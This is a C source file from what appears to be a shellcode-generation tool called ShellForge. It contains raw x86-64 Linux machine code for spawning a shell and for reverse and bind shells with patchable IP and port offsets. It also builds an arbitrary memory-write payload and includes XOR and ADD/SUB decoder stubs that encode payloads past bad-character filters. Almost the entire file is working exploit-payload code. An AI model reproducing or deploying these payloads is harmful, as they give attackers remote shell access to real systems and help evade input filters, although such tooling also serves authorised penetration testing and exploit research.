#include "shellforge.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

/* ─────────────────────────────────────────────
   ShellForge Core — Phase 2
   Constraint Solver + Multi-Goal Synthesis
   ───────────────────────────────────────────── */

static sf_status_t synth_x86_64_linux(const sf_constraints_t *c, sf_result_t *r);

/* Phase 3 arch synthesisers — defined in separate translation units */
sf_status_t sf_synth_x86_32_linux(const sf_constraints_t *c, sf_result_t *r);
sf_status_t sf_synth_arm_linux   (const sf_constraints_t *c, sf_result_t *r);
sf_status_t sf_synth_mips_linux  (const sf_constraints_t *c, sf_result_t *r);
/* Phase 4 Windows */
sf_status_t sf_synth_x86_64_windows(const sf_constraints_t *c, sf_result_t *r);
static sf_status_t synth_x86_32_linux(const sf_constraints_t *c, sf_result_t *r);
static sf_status_t synth_arm_linux   (const sf_constraints_t *c, sf_result_t *r);
static sf_status_t synth_mips_linux  (const sf_constraints_t *c, sf_result_t *r);
static sf_status_t encode_xor        (sf_result_t *r, const sf_constraints_t *c);
static sf_status_t encode_add_sub    (sf_result_t *r, const sf_constraints_t *c);
static int  parse_host_port(const sf_constraints_t *c, uint32_t *out_ip, uint16_t *out_port);
static void append_disasm(sf_result_t *r, const char *text);
static int  buf_append(uint8_t *dst, size_t *dst_len, size_t dst_max, const uint8_t *src, size_t src_len);

/* ── Constraint helpers ─────────────────────── */

void sf_constraints_init(sf_constraints_t *c) {
    memset(c, 0, sizeof(sf_constraints_t));
    c->arch = ARCH_X86_64; c->os = OS_LINUX;
    c->goal = GOAL_EXEC_SHELL; c->encoding = ENC_AUTO;
}

int sf_add_bad_char(sf_constraints_t *c, uint8_t byte) {
    if (c->bad_char_count >= SF_MAX_BAD_CHARS) return -1;
    for (size_t i = 0; i < c->bad_char_count; i++)
        if (c->bad_chars[i] == byte) return 0;
    c->bad_chars[c->bad_char_count++] = byte;
    return 0;
}

int sf_is_bad_char(const sf_constraints_t *c, uint8_t byte) {
    if (c->null_free    && byte == 0x00) return 1;
    if (c->newline_free && (byte == 0x0a || byte == 0x0d)) return 1;
    for (size_t i = 0; i < c->bad_char_count; i++)
        if (c->bad_chars[i] == byte) return 1;
    return 0;
}

int sf_buffer_clean(const sf_constraints_t *c, const uint8_t *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        if (sf_is_bad_char(c, buf[i])) return 0;
    return 1;
}

sf_status_t sf_validate_constraints(const sf_constraints_t *c) {
    if (c->arch == ARCH_UNKNOWN || c->os == OS_UNKNOWN) return SF_ERR_INVALID_ARG;
    if ((c->goal == GOAL_REVERSE_SHELL || c->goal == GOAL_BIND_SHELL) && c->goal_args.argc < 1)
        return SF_ERR_INVALID_ARG;
    return SF_OK;
}

const char *sf_status_str(sf_status_t s) {
    switch (s) {
        case SF_OK:              return "OK";
        case SF_ERR_BAD_CHAR:    return "Bad char detected in payload";
        case SF_ERR_SIZE_EXCEED: return "Payload exceeds size budget";
        case SF_ERR_UNSUPPORTED: return "Architecture/goal not yet supported";
        case SF_ERR_ENCODE_FAIL: return "Encoder could not avoid bad chars";
        case SF_ERR_INVALID_ARG: return "Invalid constraint argument";
        default:                 return "Unknown error";
    }
}

const char *sf_version(void) { return "ShellForge 0.3.0"; }

/* ── Internal utilities ─────────────────────── */

static void append_disasm(sf_result_t *r, const char *text) {
    size_t rem = sizeof(r->disasm) - strlen(r->disasm) - 1;
    strncat(r->disasm, text, rem);
}

static int buf_append(uint8_t *dst, size_t *dst_len, size_t dst_max,
                      const uint8_t *src, size_t src_len) {
    if (*dst_len + src_len > dst_max) return -1;
    memcpy(dst + *dst_len, src, src_len);
    *dst_len += src_len;
    return 0;
}

static int parse_host_port(const sf_constraints_t *c, uint32_t *out_ip, uint16_t *out_port) {
    if (c->goal_args.argc < 1) return -1;
    char arg[SF_MAX_ARG_LEN];
    strncpy(arg, (const char *)c->goal_args.args[0], SF_MAX_ARG_LEN - 1);
    arg[SF_MAX_ARG_LEN - 1] = '\0';
    if (c->goal == GOAL_BIND_SHELL) {
        int port = atoi(arg);
        if (port <= 0 || port > 65535) return -1;
        *out_ip = 0; *out_port = htons((uint16_t)port);
        return 0;
    }
    char *colon = strrchr(arg, ':');
    if (!colon) return -1;
    *colon = '\0';
    int port = atoi(colon + 1);
    if (port <= 0 || port > 65535) return -1;
    struct in_addr addr;
    if (inet_pton(AF_INET, arg, &addr) != 1) return -1;
    *out_ip = addr.s_addr; *out_port = htons((uint16_t)port);
    return 0;
}

/* ── Synthesis dispatcher ───────────────────── */

sf_result_t sf_synthesize(const sf_constraints_t *c) {
    sf_result_t r;
    memset(&r, 0, sizeof(r));
    r.arch = c->arch; r.os = c->os; r.goal = c->goal;

    sf_status_t val = sf_validate_constraints(c);
    if (val != SF_OK) {
        r.status = val;
        snprintf(r.error_msg, sizeof(r.error_msg), "Validation failed: %s", sf_status_str(val));
        return r;
    }

    sf_status_t st = SF_ERR_UNSUPPORTED;
    if (c->os == OS_LINUX) {
        switch (c->arch) {
            case ARCH_X86_64: st = synth_x86_64_linux(c, &r); break;
            case ARCH_X86_32: st = synth_x86_32_linux(c, &r); break;
            case ARCH_ARM:    st = synth_arm_linux(c, &r);    break;
            case ARCH_MIPS:   st = synth_mips_linux(c, &r);   break;
            default: break;
        }
    } else if (c->os == OS_WINDOWS) {
        switch (c->arch) {
            case ARCH_X86_64: st = sf_synth_x86_64_windows(c, &r); break;
            default:
                r.status = SF_ERR_UNSUPPORTED;
                snprintf(r.error_msg, sizeof(r.error_msg),
                    "Windows support currently x86-64 only");
                return r;
        }
    } else {
        r.status = SF_ERR_UNSUPPORTED;
        snprintf(r.error_msg, sizeof(r.error_msg), "Unsupported OS");
        return r;
    }

    if (st != SF_OK) {
        r.status = st;
        if (!r.error_msg[0]) snprintf(r.error_msg, sizeof(r.error_msg), "%s", sf_status_str(st));
        return r;
    }

    if (!sf_buffer_clean(c, r.payload, r.payload_len)) {
        sf_encoding_t enc = c->encoding;
        sf_status_t es = SF_ERR_ENCODE_FAIL;
        if (enc == ENC_AUTO || enc == ENC_XOR)     es = encode_xor(&r, c);
        if (es != SF_OK && (enc == ENC_AUTO || enc == ENC_ADD_SUB)) es = encode_add_sub(&r, c);
        if (es != SF_OK) {
            r.status = SF_ERR_ENCODE_FAIL;
            snprintf(r.error_msg, sizeof(r.error_msg), "No encoder could satisfy constraints");
            return r;
        }
        r.encoding_used = (enc == ENC_ADD_SUB) ? ENC_ADD_SUB : ENC_XOR;
    } else {
        r.encoding_used = ENC_NONE;
    }

    if (c->size_budget > 0 && r.payload_len > c->size_budget) {
        r.status = SF_ERR_SIZE_EXCEED;
        snprintf(r.error_msg, sizeof(r.error_msg),
                 "Payload %zu bytes exceeds budget of %zu", r.payload_len, c->size_budget);
        return r;
    }

    r.status = SF_OK;
    return r;
}

/* ══════════════════════════════════════════════
   x86-64 Linux Payloads
   ══════════════════════════════════════════════ */

/* execve(/bin//sh) — 26 bytes */
static const uint8_t EXEC_SHELL_X86_64[] = {
    0x48,0x31,0xf6, 0x48,0x31,0xd2, 0x48,0x31,0xc0,
    0x48,0xbb, 0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,
    0x53, 0x54, 0x5f, 0xb0,0x3b, 0x0f,0x05
};

/* Reverse shell template — patch port@29, ip@31 */
#define RS_PORT_OFF 29
#define RS_IP_OFF   31
static const uint8_t REVSHELL_X86_64[] = {
    /* socket(2,1,0) */
    0x48,0x31,0xc0, 0x48,0x31,0xff, 0x48,0x31,0xf6, 0x48,0x31,0xd2,
    0xb0,0x29, 0x40,0xb7,0x02, 0x40,0xb6,0x01, 0x0f,0x05,
    0x48,0x89,0xc7,
    /* sockaddr on stack */
    0x48,0x31,0xc0, 0x50,
    0x68,0x00,0x00,0x00,0x00,       /* push ip   [31] */
    0x66,0x68,0x00,0x00,            /* pushw port [29] */
    0x66,0x6a,0x02,
    0x48,0x89,0xe6,
    /* connect(sockfd,&sa,16) */
    0xb0,0x2a, 0xb2,0x10, 0x0f,0x05,
    /* dup2 x3 */
    0xb0,0x21, 0x40,0xb6,0x02, 0x0f,0x05,
    0xb0,0x21, 0x40,0xb6,0x01, 0x0f,0x05,
    0xb0,0x21, 0x40,0xb6,0x00, 0x0f,0x05,
    /* execve */
    0x48,0x31,0xf6, 0x48,0x31,0xd2, 0x48,0x31,0xc0,
    0x48,0xbb, 0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,
    0x53, 0x54, 0x5f, 0xb0,0x3b, 0x0f,0x05
};

/* Bind shell template — patch port@28 */
#define BS_PORT_OFF 28
static const uint8_t BINDSHELL_X86_64[] = {
    /* socket(2,1,0) */
    0x48,0x31,0xc0, 0x48,0x31,0xff, 0x48,0x31,0xf6, 0x48,0x31,0xd2,
    0xb0,0x29, 0x40,0xb7,0x02, 0x40,0xb6,0x01, 0x0f,0x05,
    0x48,0x89,0xc7,
    /* sockaddr on stack */
    0x48,0x31,0xc0, 0x50, 0x50,
    0x66,0x68,0x00,0x00,            /* pushw port [28] */
    0x66,0x6a,0x02,
    0x48,0x89,0xe6,
    /* bind */
    0xb0,0x31, 0xb2,0x10, 0x0f,0x05,
    /* listen(sockfd,1) */
    0xb0,0x32, 0x40,0xb6,0x01, 0x0f,0x05,
    /* accept */
    0x48,0x31,0xf6, 0x48,0x31,0xd2, 0xb0,0x2b, 0x0f,0x05,
    0x48,0x89,0xc7,
    /* dup2 x3 */
    0xb0,0x21, 0x40,0xb6,0x02, 0x0f,0x05,
    0xb0,0x21, 0x40,0xb6,0x01, 0x0f,0x05,
    0xb0,0x21, 0x40,0xb6,0x00, 0x0f,0x05,
    /* execve */
    0x48,0x31,0xf6, 0x48,0x31,0xd2, 0x48,0x31,0xc0,
    0x48,0xbb, 0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,
    0x53, 0x54, 0x5f, 0xb0,0x3b, 0x0f,0x05
};

static sf_status_t synth_x86_64_linux(const sf_constraints_t *c, sf_result_t *r) {
    switch (c->goal) {

        case GOAL_EXEC_SHELL:
            memcpy(r->payload, EXEC_SHELL_X86_64, sizeof(EXEC_SHELL_X86_64));
            r->payload_len = sizeof(EXEC_SHELL_X86_64);
            append_disasm(r,
                "xor rsi,rsi\nxor rdx,rdx\nxor rax,rax\n"
                "mov rbx,0x68732f6e69622f2f\npush rbx\npush rsp\npop rdi\n"
                "mov al,0x3b  ; execve\nsyscall\n");
            return SF_OK;

        case GOAL_REVERSE_SHELL: {
            uint32_t ip=0; uint16_t port=0;
            if (parse_host_port(c,&ip,&port)!=0) {
                snprintf(r->error_msg,sizeof(r->error_msg),
                    "Bad args — use goal_args[0]='192.168.1.1:4444'");
                return SF_ERR_INVALID_ARG;
            }
            memcpy(r->payload, REVSHELL_X86_64, sizeof(REVSHELL_X86_64));
            /* pushw stores little-endian: lo byte first */
            r->payload[RS_PORT_OFF]   = port&0xff;
            r->payload[RS_PORT_OFF+1] = (port>>8)&0xff;
            memcpy(&r->payload[RS_IP_OFF], &ip, 4);
            r->payload_len = sizeof(REVSHELL_X86_64);
            uint8_t *p=(uint8_t*)&ip;
            char d[256];
            snprintf(d,sizeof(d),"; reverse shell → %u.%u.%u.%u:%u\n"
                "socket→connect→dup2(2,1,0)→execve(/bin//sh)\n",
                p[0],p[1],p[2],p[3],ntohs(port));
            append_disasm(r,d);
            return SF_OK;
        }

        case GOAL_BIND_SHELL: {
            uint32_t ip=0; uint16_t port=0;
            if (parse_host_port(c,&ip,&port)!=0) {
                snprintf(r->error_msg,sizeof(r->error_msg),
                    "Bad args — use goal_args[0]='4444'");
                return SF_ERR_INVALID_ARG;
            }
            memcpy(r->payload, BINDSHELL_X86_64, sizeof(BINDSHELL_X86_64));
            r->payload[BS_PORT_OFF]   = port&0xff;
            r->payload[BS_PORT_OFF+1] = (port>>8)&0xff;
            r->payload_len = sizeof(BINDSHELL_X86_64);
            char d[128];
            snprintf(d,sizeof(d),"; bind shell on port %u\n"
                "socket→bind→listen→accept→dup2(2,1,0)→execve(/bin//sh)\n",
                ntohs(port));
            append_disasm(r,d);
            return SF_OK;
        }

        case GOAL_ARBITRARY_WRITE: {
            if (c->goal_args.argc < 2) {
                snprintf(r->error_msg,sizeof(r->error_msg),
                    "Need goal_args[0]=address goal_args[1]=value (hex)");
                return SF_ERR_INVALID_ARG;
            }
            uint64_t addr  = strtoull((const char*)c->goal_args.args[0],NULL,0);
            uint64_t value = strtoull((const char*)c->goal_args.args[1],NULL,0);
            uint8_t sc[24]; size_t pos=0;
            sc[pos++]=0x48; sc[pos++]=0xb8; memcpy(sc+pos,&value,8); pos+=8;
            sc[pos++]=0x48; sc[pos++]=0xbb; memcpy(sc+pos,&addr,8);  pos+=8;
            sc[pos++]=0x48; sc[pos++]=0x89; sc[pos++]=0x03;
            sc[pos++]=0xc3;
            memcpy(r->payload,sc,pos); r->payload_len=pos;
            char d[256];
            snprintf(d,sizeof(d),
                "; arb write: *0x%llx = 0x%llx\n"
                "mov rax,0x%llx\nmov rbx,0x%llx\nmov [rbx],rax\nret\n",
                (unsigned long long)addr,(unsigned long long)value,
                (unsigned long long)value,(unsigned long long)addr);
            append_disasm(r,d);
            return SF_OK;
        }

        default:
            snprintf(r->error_msg,sizeof(r->error_msg),"Goal not implemented");
            return SF_ERR_UNSUPPORTED;
    }
}

/* ── Phase 3 arch dispatchers ───────────────── */
static sf_status_t synth_x86_32_linux(const sf_constraints_t *c, sf_result_t *r) {
    return sf_synth_x86_32_linux(c, r);
}
static sf_status_t synth_arm_linux(const sf_constraints_t *c, sf_result_t *r) {
    return sf_synth_arm_linux(c, r);
}
static sf_status_t synth_mips_linux(const sf_constraints_t *c, sf_result_t *r) {
    return sf_synth_mips_linux(c, r);
}

/* ══════════════════════════════════════════════
   XOR Encoder with REX-free decoder stub
   Layout: [stub 23B][encoded payload]
   REX-free: uses push/pop for mov rbx,rsi
             uses inc esi (32-bit, zero-extends)
             uses xor ecx,ecx (32-bit, zero-extends)
   Stub bytes: LEN_OFF=8, KEY_OFF=11
   ══════════════════════════════════════════════ */
#define XOR_STUB_LEN  23
#define XOR_LEN_OFF    8
#define XOR_KEY_OFF   11
static const uint8_t XOR_STUB[XOR_STUB_LEN] = {
    0xeb,0x10,          /* [0]  jmp +18 → call      */
    0x5e,               /* [2]  pop  rsi             */
    0x56,               /* [3]  push rsi             */
    0x5b,               /* [4]  pop  rbx (=mov rbx,rsi, no REX) */
    0x31,0xc9,          /* [5]  xor  ecx,ecx         */
    0xb1,0x00,          /* [7]  mov  cl,<LEN>  [8]   */
    0x80,0x36,0x00,     /* [9]  xor  [rsi],<KEY>[11] */
    0xff,0xc6,          /* [12] inc  esi (zero-extends) */
    0xe2,0xf9,          /* [14] loop [9]             */
    0xff,0xe3,          /* [16] jmp  rbx             */
    0xe8,0xeb,0xff,0xff,0xff /* [18] call -0x15+2    */
};

static sf_status_t encode_xor(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int key=1; key<=0xff; key++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=orig[i]^(uint8_t)key;
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;

        /* Patch stub BEFORE clean check (placeholders are 0x00) */
        uint8_t stub[XOR_STUB_LEN];
        memcpy(stub,XOR_STUB,XOR_STUB_LEN);
        stub[XOR_LEN_OFF]=(uint8_t)olen;
        stub[XOR_KEY_OFF]=(uint8_t)key;
        if (!sf_buffer_clean(c,stub,XOR_STUB_LEN)) continue;
        if (sf_is_bad_char(c,(uint8_t)key)) continue;

        uint8_t full[SF_MAX_PAYLOAD]; size_t flen=0;
        if (buf_append(full,&flen,SF_MAX_PAYLOAD,stub,XOR_STUB_LEN)!=0) continue;
        if (buf_append(full,&flen,SF_MAX_PAYLOAD,enc,olen)!=0) continue;

        memcpy(r->payload,full,flen); r->payload_len=flen;

        char note[256];
        snprintf(note,sizeof(note),
            "; XOR stub key=0x%02x len=%zu\n"
            "jmp payload_start\npop rsi\nmov rbx,rsi\n"
            "xor rcx,rcx\nmov cl,0x%02x\n"
            "xor [rsi],0x%02x\ninc rsi\nloop\njmp rbx\ncall -0x15\n"
            "; encoded payload:\n", key,olen,(uint8_t)olen,(uint8_t)key);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        append_disasm(r,note); append_disasm(r,saved);
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}

/* ══════════════════════════════════════════════
   ADD/SUB Encoder — single global delta
   encoded[i] = (original[i] - delta) mod 256
   decoder adds delta back at runtime
   ══════════════════════════════════════════════ */
#define ADDSUB_STUB_LEN  23
#define ADDSUB_LEN_OFF    8
#define ADDSUB_KEY_OFF   11
static const uint8_t ADDSUB_STUB[ADDSUB_STUB_LEN] = {
    0xeb,0x10,          /* [0]  jmp +18 → call         */
    0x5e,               /* [2]  pop  rsi               */
    0x56,               /* [3]  push rsi               */
    0x5b,               /* [4]  pop  rbx               */
    0x31,0xc9,          /* [5]  xor  ecx,ecx           */
    0xb1,0x00,          /* [7]  mov  cl,<LEN>   [8]    */
    0x80,0x06,0x00,     /* [9]  add  [rsi],<KEY>[11]   */
    0xff,0xc6,          /* [12] inc  esi               */
    0xe2,0xf9,          /* [14] loop [9]               */
    0xff,0xe3,          /* [16] jmp  rbx               */
    0xe8,0xeb,0xff,0xff,0xff /* [18] call -0x15+2      */
};

static sf_status_t encode_add_sub(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int delta=1; delta<=0xff; delta++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=(uint8_t)((orig[i]-delta)&0xff);
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;

        uint8_t stub[ADDSUB_STUB_LEN];
        memcpy(stub,ADDSUB_STUB,ADDSUB_STUB_LEN);
        stub[ADDSUB_LEN_OFF]=(uint8_t)olen;
        stub[ADDSUB_KEY_OFF]=(uint8_t)delta;
        if (sf_is_bad_char(c,(uint8_t)delta)) continue;
        if (!sf_buffer_clean(c,stub,ADDSUB_STUB_LEN)) continue;

        uint8_t full[SF_MAX_PAYLOAD]; size_t flen=0;
        if (buf_append(full,&flen,SF_MAX_PAYLOAD,stub,ADDSUB_STUB_LEN)!=0) continue;
        if (buf_append(full,&flen,SF_MAX_PAYLOAD,enc,olen)!=0) continue;

        memcpy(r->payload,full,flen); r->payload_len=flen;

        char note[256];
        snprintf(note,sizeof(note),
            "; ADD/SUB stub delta=0x%02x len=%zu\n"
            "jmp payload_start\npop rsi\nmov rbx,rsi\n"
            "xor rcx,rcx\nmov cl,0x%02x\n"
            "add [rsi],0x%02x\ninc rsi\nloop\njmp rbx\ncall -0x13\n"
            "; encoded payload:\n", delta,olen,(uint8_t)olen,(uint8_t)delta);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        append_disasm(r,note); append_disasm(r,saved);
        r->encoding_used = ENC_ADD_SUB;
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}
